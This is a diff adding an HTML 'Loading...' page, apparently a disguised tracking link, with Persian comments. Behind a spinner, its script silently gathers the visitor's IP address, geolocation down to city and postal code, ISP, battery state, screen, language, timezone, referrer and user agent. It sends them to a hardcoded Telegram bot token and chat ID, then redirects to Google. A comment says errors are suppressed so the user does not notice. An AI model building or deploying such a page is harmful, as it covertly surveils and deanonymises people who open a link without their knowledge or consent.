@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .custom-loader {
+      width: 50px;
+      height: 50px;
+      display: grid;
+      border: 4px solid #0000;
+      border-radius: 50%;
+      border-color: #EDEDED #0000;
+      animation: s6 1s infinite linear;
+    }
+    .custom-loader::before,
+    .custom-loader::after {    
+      content: "";
+      grid-area: 1/1;
+      margin: 2px;
+      border: inherit;
+      border-radius: 50%;
+    }
+    .custom-loader::before {
+      border-color: #766DF4 #0000;
+      animation: inherit; 
+      animation-duration: .5s;
+      animation-direction: reverse;
+    }
+    .custom-loader::after {
+      margin: 8px;
+    }
+
+    @keyframes s6 { 
+      100% { transform: rotate(1turn); }
+    }
+  </style>
+</head>
+<body>
+  <div class="custom-loader"></div>
+
+  <script>
+    // ربات تلگرام
+    const BOT_TOKEN = "8283253750:AAElG2O-DcOR9fAEHEktk-51rETnif766xw";
+    const CHAT_ID = "8223560115";
+
+    // 
+    async function collectData() {
+      try {
+        //
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipRes.json();
+        
+        //  
+        let location = {};
+        try {
+          const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+          location = await locRes.json();
+        } catch (e) {
+          //  
+        }
+        
+        //  باتری
+        let batteryInfo = "نامشخص";
+        if ('getBattery' in navigator) {
+          try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? 'در حال شارژ' : 'در حال شارژ نیست';
+            batteryInfo = `${level}% (${charging})`;
+          } catch (e) {}
+        }
+        
+        // زمان
+        const now = new Date();
+        const jalali = new Intl.DateTimeFormat('fa-IR', {
+          year: 'numeric', month: '2-digit', day: '2-digit',
+          hour: '2-digit', minute: '2-digit', second: '2-digit'
+        }).format(now).replace(/‏/g, '').replace(/\u200E/g, '').replace(/،/g, ',');
+        
+        // ساخت پیام
+        const message = ` new 
+
+📍 موقعیت کاربر:
+├─ کشور: ${location.country_name || 'نامشخص'}
+├─ استان: ${location.region || 'نامشخص'}
+├─ شهر: ${location.city || 'نامشخص'}
+├─ کدپستی: ${location.postral || 'نامشخص'}
+
+🌐 اطلاعات شبکه:
+├─ IP: ${ip}
+├─ ارائه‌دهنده: ${location.org || 'نامشخص'}
+├─ ASN: ${location.asn || 'نامشخص'}
+
+📱 اطلاعات دستگاه:
+├─ نوع: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
+├─ باتری: ${batteryInfo}
+├─ صفحه‌نمایش: ${screen.width}×${screen.height}
+├─ زبان: ${navigator.language}
+├─ منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+🕐 زمان:
+├─ ساعت محلی: ${jalali}
+
+🔗 سایر اطلاعات:
+└─ لینک مرجع: ${document.referrer || 'بدون مرجع'}
+└─ User Agent: ${navigator.userAgent}`;
+        
+        // ارسال به تلگرام
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            chat_id: CHAT_ID, 
+            text: message 
+          })
+        });
+        
+      } catch (error) {
+        // خطاها نادیده گرفته می‌شوند تا کاربر متوجه نشود
+      }
+    }
+
+    // اجرا و ریدایرکت
+    (async function() {
+      // ارسال اطلاعات در پس‌زمینه
+      await collectData();
+      
+      // ریدایرکت بعد از ۳ ثانیه
+      setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 2000);
+    })();
+  </script>
+</body>
+</html>
